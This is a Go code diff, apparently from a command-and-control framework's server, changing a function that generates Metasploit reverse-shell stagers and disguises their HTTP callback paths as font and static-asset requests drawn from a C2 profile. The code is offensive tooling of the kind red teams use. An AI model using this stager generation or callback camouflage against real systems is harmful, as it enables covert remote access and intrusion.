@@ -37,7 +37,7 @@ import (
 )
 
 var (
-	msfLog = log.NamedLogger("rcp", "msf")
+	msfLog = log.NamedLogger("rpc", "msf")
 )
 
 // Msf - Helper function to execute MSF payloads on the remote system
@@ -167,10 +167,10 @@ func (rpc *Server) MsfStage(ctx context.Context, req *clientpb.MsfStagerReq) (*c
 		payload = "meterpreter/reverse_tcp"
 	case clientpb.StageProtocol_HTTP:
 		payload = "custom/reverse_winhttp"
-		uri = generateCallbackURI()
+		uri = generateCallbackURI(req.HTTPC2ConfigName)
 	case clientpb.StageProtocol_HTTPS:
 		payload = "custom/reverse_winhttps"
-		uri = generateCallbackURI()
+		uri = generateCallbackURI(req.HTTPC2ConfigName)
 	default:
 		return MSFStage, errors.New("protocol not supported")
 	}
@@ -181,14 +181,15 @@ func (rpc *Server) MsfStage(ctx context.Context, req *clientpb.MsfStagerReq) (*c
 	}
 
 	venomConfig := msf.VenomConfig{
-		Os:       req.GetOS(),
-		Payload:  payload,
-		LHost:    req.GetHost(),
-		LPort:    uint16(req.GetPort()),
-		Arch:     arch,
-		Format:   req.GetFormat(),
-		BadChars: req.GetBadChars(), // TODO: make this configurable
-		Luri:     uri,
+		Os:         req.GetOS(),
+		Payload:    payload,
+		LHost:      req.GetHost(),
+		LPort:      uint16(req.GetPort()),
+		Arch:       arch,
+		Format:     req.GetFormat(),
+		BadChars:   req.GetBadChars(), // TODO: make this configurable
+		Luri:       uri,
+		AdvOptions: req.AdvOptions,
 	}
 
 	stage, err := msf.VenomPayload(venomConfig)
@@ -206,17 +207,26 @@ func (rpc *Server) MsfStage(ctx context.Context, req *clientpb.MsfStagerReq) (*c
 }
 
 // Utility functions
-func generateCallbackURI() string {
-	segments := []string{"static", "assets", "fonts", "locales"}
-	// Randomly picked font while browsing on the web
-	fontNames := []string{
-		"attribute_text_w01_regular.woff",
-		"ZillaSlab-Regular.subset.bbc33fb47cf6.woff",
-		"ZillaSlab-Bold.subset.e96c15f68c68.woff",
-		"Inter-Regular.woff",
-		"Inter-Medium.woff",
+func generateCallbackURI(httpC2ConfigName string) string {
+	httpC2Config, err := db.LoadHTTPC2ConfigByName(httpC2ConfigName)
+	if err != nil {
+		return ""
 	}
-	return path.Join(randomPath(segments, fontNames)...)
+	segments := httpC2Config.ImplantConfig.PathSegments
+	StageFiles := []string{}
+	StagePaths := []string{}
+
+	for _, segment := range segments {
+		if segment.SegmentType == 3 {
+			if segment.IsFile {
+				StageFiles = append(StageFiles, segment.Value)
+			} else {
+				StagePaths = append(StagePaths, segment.Value)
+			}
+		}
+	}
+
+	return path.Join(randomPath(StagePaths, StageFiles)...)
 }
 
 func randomPath(segments []string, filenames []string) []string {
